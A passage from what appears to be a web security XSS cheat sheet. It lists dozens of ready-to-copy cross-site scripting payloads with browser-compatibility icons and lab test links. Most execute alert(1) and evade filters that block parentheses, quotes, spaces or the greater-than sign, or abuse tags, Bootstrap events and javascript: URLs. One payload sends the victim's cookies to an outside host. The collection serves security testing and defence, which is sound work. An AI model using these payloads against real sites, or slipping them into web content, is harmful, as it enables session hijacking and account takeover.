clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#noembed-consuming-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNoscript consuming tag\n\n[`<noscript><img title=\"</noscript><img src onerror=alert(1)>\"></noscript>`](https://portswigger-labs.net/xss/xss.php?x=%3Cnoscript%3E%3Cimg%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fnoscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#noscript-consuming-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nStyle consuming tag\n\n[`<style><img title=\"</style><img src onerror=alert(1)>\"></style>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%3Cimg%20title%3D%22%3C%2Fstyle%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fstyle%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#style-consuming-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nScript consuming tag\n\n[`<script><img title=\"</script><img src onerror=alert(1)>\"></script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%3Cimg%20title%3D%22%3C%2Fscript%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#script-consuming-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\niframe consuming tag\n\n[`<iframe><img title=\"</iframe><img src onerror=alert(1)>\"></iframe>`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%3E%3Cimg%20title%3D%22%3C%2Fiframe%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#iframe-consuming-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nxmp consuming tag\n\n[`<xmp><img title=\"</xmp><img src onerror=alert(1)>\"></xmp>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxmp%3E%3Cimg%20title%3D%22%3C%2Fxmp%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fxmp%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xmp-consuming-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\ntextarea consuming tag\n\n[`<textarea><img title=\"</textarea><img src onerror=alert(1)>\"></textarea>`](https://portswigger-labs.net/xss/xss.php?x=%3Ctextarea%3E%3Cimg%20title%3D%22%3C%2Ftextarea%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Ftextarea%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#textarea-consuming-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nnoframes consuming tag\n\n[`<noframes><img title=\"</noframes><img src onerror=alert(1)>\"></noframes>`](https://portswigger-labs.net/xss/xss.php?x=%3Cnoframes%3E%3Cimg%20title%3D%22%3C%2Fnoframes%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fnoframes%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#noframes-consuming-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nTitle consuming tag\n\n[`<title><img title=\"</title><img src onerror=alert(1)>\"></title>`](https://portswigger-labs.net/xss/xss.php?x=%3Ctitle%3E%3Cimg%20title%3D%22%3C%2Ftitle%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Ftitle%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#title-consuming-tag)\n\nFile upload attacks\n-------------------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nAdd blob to file object\n\n[`<input type=\"file\" id=\"fileInput\" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20type%3D%22file%22%20id%3D%22fileInput%22%20%2F%3E%3Cscript%3Econst%20fileInput%20%3D%20document.getElementById%28%27fileInput%27%29%3Bconst%20dataTransfer%20%3D%20new%20DataTransfer%28%29%3Bconst%20file%20%3D%20new%20File%28%5B%27Hello%20world%21%27%5D%2C%20%27hello.txt%27%2C%20%7Btype%3A%20%27text%2Fplain%27%7D%29%3BdataTransfer.items.add%28file%29%3BfileInput.files%20%3D%20dataTransfer.files%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#add-blob-to-file-object)\n\nRestricted characters\n---------------------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using exception handling\n\n[`<script>onerror=alert;throw 1</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Eonerror%3Dalert%3Bthrow%201%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-exception-handling)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using exception handling no semi colons\n\n[`<script>{onerror=alert}throw 1</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%7Bonerror%3Dalert%7Dthrow%201%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-exception-handling-no-semi-colons)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using exception handling no semi colons using expressions\n\n[`<script>throw onerror=alert,1</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror%3Dalert%2C1%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-exception-handling-no-semi-colons-using-expressions)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\nNo parentheses using exception handling and string eval on Chrome / Edge\n\n[`<script>throw onerror=eval,'=alert\\x281\\x29'</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror%3Deval%2C%27%3Dalert%5Cx281%5Cx29%27%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-exception-handling-and-string-eval-on-chrome--edge)\n\n![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using exception handling and string eval on Safari\n\n[`<script>throw onerror=eval,'alert\\x281\\x29'</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror%3Deval%2C%27alert%5Cx281%5Cx29%27%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-exception-handling-and-string-eval-on-safari)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nNo parentheses using exception handling and object eval on Firefox\n\n[`<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\\x281\\x29'}</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%7Bonerror%3Deval%7Dthrow%7BlineNumber%3A1%2CcolumnNumber%3A1%2CfileName%3A1%2Cmessage%3A%27alert%5Cx281%5Cx29%27%7D%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-exception-handling-and-object-eval-on-firefox)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using exception handling and object eval on Firefox / Safari\n\n[`<script>throw onerror=eval,e=new Error,e.message='alert\\x281\\x29',e</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror%3Deval%2Ce%3Dnew%20Error%2Ce.message%3D%27alert%5Cx281%5Cx29%27%2Ce%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-exception-handling-and-object-eval-on-firefox--safari)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using exception handling and location hash eval on all browsers\n\n[`<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror%3DUncaught%3Deval%2Ce%3Dnew%20Error%2Ce.message%3D%27%2F%2A%27%2Blocation.hash%2C%21%21window.InstallTrigger%3Fe%3Ae.message%3C%2Fscript%3E&context=html#*/;alert\\(1\\);)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-exception-handling-and-location-hash-eval-on-all-browsers)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses, no quotes, no spaces using exception handling and location hash eval on all browsers\n\n[`<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%7B%7D%2Conerror%3DUncaught%3Deval%2Ch%3Dlocation.hash%2Ce%3D%7BlineNumber%3A1%2CcolumnNumber%3A1%2CfileName%3A0%2Cmessage%3Ah%5B2%5D%2Bh%5B1%5D%2Bh%7D%2C%21%21window.InstallTrigger%3Fe%3Ae.message%3C%2Fscript%3E&context=html#*/;alert\\(1\\);)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-no-quotes-no-spaces-using-exception-handling-and-location-hash-eval-on-all-browsers)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses, no quotes, no spaces, no curly brackets using exception handling and location hash eval on all browsers\n\n[`<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%2Fx%2F%2Conerror%3DUncaught%3Deval%2Ch%3Dlocation.hash%2Ce%3DError%2Ce.lineNumber%3De.columnNumber%3De.fileName%3De.message%3Dh%5B2%5D%2Bh%5B1%5D%2Bh%2C%21%21window.InstallTrigger%3Fe%3Ae.message%3C%2Fscript%3E&context=html#*/;alert\\(1\\);)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-no-quotes-no-spaces-no-curly-brackets-using-exception-handling-and-location-hash-eval-on-all-browsers)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using ES6 hasInstance and instanceof with eval\n\n[`<script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%27alert%5Cx281%5Cx29%27instanceof%7B%5BSymbol.hasInstance%5D%3Aeval%7D%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-es6-hasinstance-and-instanceof-with-eval)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using ES6 hasInstance and instanceof with eval without .\n\n[`<script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3E%27alert%5Cx281%5Cx29%27instanceof%7B%5BSymbol%5B%27hasInstance%27%5D%5D%3Aeval%7D%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-es6-hasinstance-and-instanceof-with-eval-without-)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using location redirect\n\n[`<script>location='javascript:alert\\x281\\x29'</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Elocation%3D%27javascript%3Aalert%5Cx281%5Cx29%27%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-location-redirect)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using location redirect no strings\n\n[`<script>location=name</script>`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20name=javascript:alert\\(1\\)%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cscript%3Elocation=name%3C/script%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-location-redirect-no-strings)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using template strings\n\n[``<script>alert`1`</script>``](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ealert%601%60%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-template-strings)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses using template strings and location hash\n\n[``<script>new Function`X${document.location.hash.substr`1`}`</script>``](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Enew%20Function%60X%24%7Bdocument.location.hash.substr%601%60%7D%60%3C%2Fscript%3E&context=html#alert\\(1\\))\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-using-template-strings-and-location-hash)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNo parentheses or spaces, using template strings and location hash\n\n[``<script>Function`X${document.location.hash.substr`1`}```</script>``](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3EFunction%60X%24%7Bdocument.location.hash.substr%601%60%7D%60%60%60%3C%2Fscript%3E&context=html#alert\\(1\\))\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#no-parentheses-or-spaces-using-template-strings-and-location-hash)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS cookie exfiltration without parentheses, backticks or quotes\n\n[`<video><source onerror=location=/\\02.rs/+document.cookie>`](https://portswigger-labs.net/xss/xss.php?x=%3Cvideo%3E%3Csource%20onerror%3Dlocation%3D%2F%5C02.rs%2F%2Bdocument.cookie%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-cookie-exfiltration-without-parentheses-backticks-or-quotes)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS without greater than\n\n[`<svg onload=alert(1) `](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload%3Dalert%281%29%20&context=html) \n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-without-greater-than)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXSS without greater using a HTML comment\n\n[`<svg onload=alert(1)<!--`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload%3Dalert%281%29%3C%21--&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xss-without-greater-using-a-html-comment)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nArray based destructuring using onerror\n\n[`<script>throw[onerror]=[alert],1</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%5Bonerror%5D%3D%5Balert%5D%2C1%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#array-based-destructuring-using-onerror)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nDestructuring using onerror\n\n[`<script>var{a:onerror}={a:alert};throw 1</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Evar%7Ba%3Aonerror%7D%3D%7Ba%3Aalert%7D%3Bthrow%201%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#destructuring-using-onerror)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nDestructuring using default values and onerror\n\n[`<script>var{haha:onerror=alert}=0;throw 1</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Evar%7Bhaha%3Aonerror%3Dalert%7D%3D0%3Bthrow%201%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#destructuring-using-default-values-and-onerror)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nVector using window.name\n\n[`<script>window.name='javascript:alert(1)';</script><svg onload=location=name>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ewindow.name%3D%27javascript%3Aalert%281%29%27%3B%3C%2Fscript%3E%3Csvg%20onload%3Dlocation%3Dname%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vector-using-windowname)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nAvoiding Invalid left-hand side in assignment without \\`, (), ?, \\[\\], or , using object literal\n\n[``` <script>window.name='javascript:alert(1)';function blah(){} blah(\"\"+{a:location=name}+\"\")</script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ewindow.name%3D%27javascript%3Aalert%281%29%27%3Bfunction%20blah%28%29%7B%7D%0Ablah%28%22%22%2B%7Ba%3Alocation%3Dname%7D%2B%22%22%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#avoiding-invalid-lefthand-side-in-assignment-without------or--using-object-literal)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nAvoiding Invalid left-hand side in assignment without \\`, (), ?, \\[\\], or , using new class\n\n[``` <script>window.name='javascript:alert(1)';function blah(){} blah(\"\"+new class b{toString=e=>location=name}+\"\")</script> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ewindow.name%3D%27javascript%3Aalert%281%29%27%3Bfunction%20blah%28%29%7B%7D%0Ablah%28%22%22%2Bnew%20class%20b%7BtoString%3De%3D%3Elocation%3Dname%7D%2B%22%22%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#avoiding-invalid-lefthand-side-in-assignment-without------or--using-new-class)\n\nFrameworks\n----------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nBootstrap onanimationstart event\n\n[`<xss class=progress-bar-animated onanimationstart=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20class%3Dprogress-bar-animated%20onanimationstart%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#bootstrap-onanimationstart-event)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nBootstrap ontransitionend event\n\n[`<xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20class%3D%22carousel%20slide%22%20data-ride%3Dcarousel%20data-interval%3D100%20ontransitionend%3Dalert%281%29%3E%3Cxss%20class%3Dcarousel-inner%3E%3Cxss%20class%3D%22carousel-item%20active%22%3E%3C%2Fxss%3E%3Cxss%20class%3Dcarousel-item%3E%3C%2Fxss%3E%3C%2Fxss%3E%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#bootstrap-ontransitionend-event)\n\nProtocols\n---------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nIframe src attribute JavaScript protocol\n\n[`<iframe src=\"javascript:alert(1)\">`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#iframe-src-attribute-javascript-protocol)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nObject data attribute with JavaScript protocol\n\n[`<object data=\"javascript:alert(1)\">`](https://portswigger-labs.net/xss/xss.php?x=%3Cobject%20data%3D%22javascript%3Aalert%281%29%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#object-data-attribute-with-javascript-protocol)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nEmbed src attribute with JavaScript protocol\n\n[`<embed src=\"javascript:alert(1)\">`](https://portswigger-labs.net/xss/xss.php?x=%3Cembed%20src%3D%22javascript%3Aalert%281%29%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#embed-src-attribute-with-javascript-protocol)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nA standard JavaScript protocol\n\n[`<a 